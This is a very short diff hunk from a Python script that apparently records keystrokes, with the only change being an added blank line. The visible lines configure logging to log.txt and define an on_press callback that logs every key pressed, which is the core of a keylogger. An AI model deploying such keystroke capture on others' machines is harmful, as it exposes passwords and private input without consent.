@@ -4,6 +4,7 @@ import logging
 
 logging.basicConfig(filename=('log.txt'), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
 
+
 def on_press(key):
     logging.info(key)
 
